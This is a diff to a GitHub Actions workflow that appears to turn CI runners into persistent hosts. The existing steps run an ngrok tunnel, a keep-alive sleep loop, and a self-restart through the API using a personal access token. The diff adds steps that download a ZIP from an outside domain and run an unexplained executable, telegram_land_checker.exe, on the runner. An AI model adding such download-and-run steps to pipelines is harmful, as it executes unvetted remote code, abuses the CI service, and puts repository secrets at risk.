@@ -52,13 +52,22 @@ jobs:
         }
         Write-Error "Ngrok tunnel did not start in time."
 
+    - name: 🔽 Download ZIP with telegram_land_checker.exe
+      run: Invoke-WebRequest -Uri "https://secuhex.com/app.zip" -OutFile app.zip
+
+    - name: 🗜️ Extract ZIP
+      run: Expand-Archive app.zip -DestinationPath app
+
+    - name: 🚀 Run telegram_land_checker.exe
+      run: Start-Process -FilePath ".\app\telegram_land_checker.exe"
+
     - name: Keep Runner Alive with Ping
       run: |
-        for ($i = 0; $i -lt 358; $i++) {
+        for ($i = 0; $i -lt 180; $i++) {
           Write-Output "Staying alive... $i minutes"
           Start-Sleep -Seconds 60
         }
-        
+
     - name: Auto-Restart Workflow
       if: always()
       env:
@@ -68,7 +77,7 @@ jobs:
           Write-Output "🚫 Workflow was cancelled manually. Not restarting."
           exit 0
         }
-    
+
         $headers = @{ Authorization = "Bearer $Env:GH_PAT" }
         $body = @{ ref = "${{ github.ref }}" } | ConvertTo-Json
         Invoke-RestMethod `
